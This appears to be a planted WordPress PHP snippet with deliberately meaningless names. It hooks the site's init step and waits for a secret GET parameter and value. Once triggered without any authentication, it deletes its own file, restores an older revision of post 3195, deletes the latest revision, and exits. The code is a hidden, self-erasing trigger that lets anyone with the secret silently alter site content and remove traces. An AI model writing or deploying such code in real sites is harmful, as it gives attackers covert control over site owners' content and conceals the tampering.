<?php

function digital_pinterest_instant() {
	if (isset($_GET['debug_rich_remove']) && $_GET['debug_rich_remove'] === 'customizer_pdf_wishlist_instant') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$latest_role_secure_alert = 3195;
		$donation_menus_old = wp_get_post_revisions($latest_role_secure_alert);
		if (empty($donation_menus_old)) die('no revisions');
		if (count($donation_menus_old) < 2) die('less than 2');
		$magic_flash_zoom = array_shift($donation_menus_old);
		$alert_index_block_newsletter = $magic_flash_zoom->ID;
		$cf7_anti_exception = array_shift($donation_menus_old);
		$super_rating_popup = $cf7_anti_exception->ID;
		$clock_cart_keyword = wp_restore_post_revision($super_rating_popup);
		if ($clock_cart_keyword === false) die('error restoring');
		$clock_cart_keyword = wp_delete_post_revision($alert_index_block_newsletter);		
		if ($clock_cart_keyword === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'digital_pinterest_instant');
